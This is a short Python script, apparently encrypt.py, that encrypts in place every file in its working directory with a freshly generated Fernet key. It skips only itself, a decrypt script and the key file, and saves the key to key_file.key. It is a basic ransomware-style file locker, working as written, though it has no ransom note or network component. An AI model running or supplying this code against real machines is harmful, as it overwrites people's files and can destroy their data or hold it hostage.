import os
from cryptography.fernet import Fernet

files = []

# Exceptions and encryption
for file in os.listdir():
    if file == "decrypt.py":
        continue
    if file == "key_file.key":
        continue
    if file == "encrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("key_file.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)